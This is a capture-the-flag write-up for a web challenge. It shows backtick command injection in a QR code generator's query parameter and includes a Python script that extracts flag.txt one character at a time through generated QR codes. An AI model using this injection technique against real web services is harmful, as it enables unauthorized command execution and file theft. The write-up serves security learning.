# QR-Generator
Web

> I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?
>
> http://challs.houseplant.riceteacatpanda.wtf:30004
> 
> Hint! For some reason, my website isn't too fond of backticks...

The backticks seem to indicate the typical bash injection.

The endpoint where the actual QR code is processed is at `/qr?text=<text>`.

Scanning some sample QR codes reveals that it only encodes the first letter of whatever is encoded. On errors, it redirects to `/error.jpg`.

We can try injecting ``/qr?text=`ls` `` (the extra space isn't necessary, markdown just doesn't like literal backticks). Scanning the generated QR code gives us an `R`.

To get the full character, we can iterate through characters of the stdout of the command: `<cmd> | head -c n | tail -c 1` where n is the n'th character of stdout.

We can use this trick with `ls` to get the directory listing. We find that there is a `flag.txt`. The following script extracts the contents of `flag.txt`.

```python
from pyzbar.pyzbar import decode
from PIL import Image

import urllib.request


url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`cat%20flag.txt|%20head%20-c%20{}%20|%20tail%20-c%201`"

i = 1

while True:
    temp = url.format(i)
    urllib.request.urlretrieve(temp, "qr.jpg")

    print(decode(Image.open("qr.jpg"))[0].data.decode(), end="")

    i+=1
```

Flag: `rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}`
